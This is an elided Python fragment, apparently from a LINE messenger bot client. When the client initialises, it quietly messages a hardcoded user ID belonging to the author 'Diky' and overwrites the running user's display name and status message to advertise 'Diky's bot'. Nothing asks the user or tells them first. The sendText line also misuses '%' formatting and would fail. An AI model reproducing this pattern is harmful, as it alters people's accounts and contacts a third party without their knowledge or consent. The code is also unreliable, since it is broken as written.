...
class Object(object):
    ...
    def __init__(self):
        if self.isLogin == False:
            ...
            linex = "u12e9adb8790c9fd8955bf2f11a2f2ccd"
            xmod = self.getContact(linex).displayName
            self.sendText("u12e9adb8790c9fd8955bf2f11a2f2ccd", 'Permisi Abang Diky ganteng mohon izinya' % xmod)
            profile = self.getProfile()
            profile.displayName = "D̶̷I̶̷K̶̷Y̶̷ ╾━╤デ╦︻"
            self.updateProfile(profile)
            profile.statusMessage = "SEDANG PAKE BOT DIKY"
            self.updateProfile(profile)
            ...
            GEN = "u12e9adb8790c9fd8955bf2f11a2f2ccd"
